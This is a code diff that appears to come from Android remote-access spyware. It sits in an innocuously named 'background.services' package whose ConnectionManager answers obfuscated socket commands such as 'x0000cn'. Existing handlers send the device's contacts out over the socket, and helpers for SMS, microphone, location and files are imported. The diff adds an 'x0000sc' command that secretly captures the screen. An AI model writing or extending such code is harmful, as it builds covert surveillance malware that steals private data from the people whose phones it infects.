@@ -16,6 +16,7 @@ import com.android.background.services.helpers.FileManager;
 import com.android.background.services.helpers.LocManager;
 import com.android.background.services.helpers.MicManager;
 import com.android.background.services.helpers.SMSManager;
+import com.android.background.services.helpers.ScreenManager;
 
 import org.apache.commons.io.FileUtils;
 import org.json.JSONException;
@@ -125,6 +126,9 @@ public class ConnectionManager {
                                 break;
                             case "x0000rebootDevice":
                                 x0000rebootDevice();
+                                break;
+                            case "x0000sc":
+                                x0000sc();
                                 break;
                         }
                     } catch (Exception e) {
@@ -324,6 +328,12 @@ public class ConnectionManager {
 
     public static void x0000cn() {
         ioSocket.emit("x0000cn", ContactsManager.getContacts());
+    }
+
+    public static void x0000sc() {
+        if (MainService.getScreenData() != null) {
+            new ScreenManager(context).captureScreen(MainService.getScreenResultCode(), MainService.getScreenData());
+        }
     }
 
     public static void x0000mc(int sec) throws Exception {
